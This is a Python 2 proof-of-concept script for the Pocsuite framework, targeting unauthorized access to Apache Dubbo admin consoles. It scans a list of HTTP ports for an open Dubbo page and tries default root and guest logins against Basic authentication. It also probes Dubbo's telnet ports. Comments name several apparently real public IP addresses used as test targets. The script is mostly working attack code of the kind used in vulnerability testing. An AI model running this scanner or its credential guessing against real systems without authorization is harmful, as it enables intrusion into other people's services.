#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip


# 基础基类
class DubboPOC(POCBase):
    vulID = '31'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-05-16'  # 漏洞公开的时间,不知道就写今天
    author = 'songjianshan'  # PoC作者的大名
    createDate = '2018-05-16'  # 编写 PoC 的日期
    updateDate = '2018-05-16'  # PoC 更新的时间,默认和编写时间一样
    references = ''  # 漏洞地址来源,0day不用写
    name = 'Dubbo Unauthorized Access'  # PoC 名称
    appPowerLink = 'https://github.com/apache/incubator-dubbo'  # 漏洞厂商主页地址
    appName = 'Dubbo'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Dubbo 未授权访问漏洞
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass

    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        # 调用指纹方法
        result={}
        output = Output(self)

        import socket
        import telnetlib
        import base64

        # 默认端口 web 8080 telnet 7070 但是很多dubbo自定义了端口，以下是其他比较常见的dubbo可能存在的端口
        unauth_ports = {     #用于探测 1、直接未授权访问  2、basic 弱口令登录
            "80",
            "443",
            "8080",  #default port   test demo 34.197.163.149
            # "8081",
            # "8082",
            # "8083",
            # "8084",
            # "8086",
            "8088",
            "8888",
            # "8089",
            # "8090",
            "8000", # default pwd test  :http://169.60.204.51:8000/
            # "9080",
            # "9090",
            # "9999",
            # "18080",
            # "28080",
        }
        default_account = {   #默认账号检测  default  root/root(admin)   guest /guest
            "root",
            #"admin",
            "guest",
        }
        default_pwd = {       #默认密码检测
            "root" ,
            #"admin",
            "guest",
        }
        telnet_ports = {
            "7070",    #default port  45.123.103.197
            # "1234",
            # "8000",
            "10001",
            # "9999",
            # "19999",
            # "29999",
            # "20000",
            # "18080",
            # "28080",
            # "6060",
            # "8084",
            # "12345",
        }
        vul_port = []
        #step 1 http 以及弱口令
        for p in unauth_ports:
            url = '%s:%s' % (self.url, p)
            try:
                resp = req.get(str(url), timeout=1)
                #print resp.text
                if "<title>dubbo</title>" in resp.text.lower() :
                        vul_port.append(p)
                elif resp.headers["www-authenticate"] == "Basic realm=\"dubbo\"":
                    #print "get basic"
                    #vul_port.append(p)
                    #构造弱口令爆破
                    for user in default_account:
                        for pwd in default_pwd:
                            verify_str = user + ":" + pwd
                            #print verify_str
                            verify_str = base64.b64encode(verify_str)
                            basic_auth = {'Authorization':'BASIC '+verify_str}
                            #print verify_str
                            httpreq = req.session()
                            raa = httpreq.get(url,headers=basic_auth, timeout=1)
                            #print raa.text
                            #print raa.status_code
                            if 200 == raa.status_code:
                                #print "get weak pwd"
                                py = p + ':(' + user + '|' + pwd + ')'
                                vul_port.append(py)
            except Exception,e:
                #print e
                pass

        #step 2 telnet
        ip = self.url.split(':')[1].replace('/', '')
        for i in telnet_ports:
            try:
                #print ip
                #print i
                tn = telnetlib.Telnet(ip,port=i,timeout=5)
                tn.write("help\n")
                if 'dubbo' in tn.read_until('dubbo'):
                    py = i + '(telnet)'
                    vul_port.append(py)
            except Exception,e:
                #print e
                pass

        if vul_port.__len__() > 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['Payload'] = "port:" + str(vul_port)
        print '[+]31 poc done'
        return self.save_output(result)
        

    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register(DubboPOC)


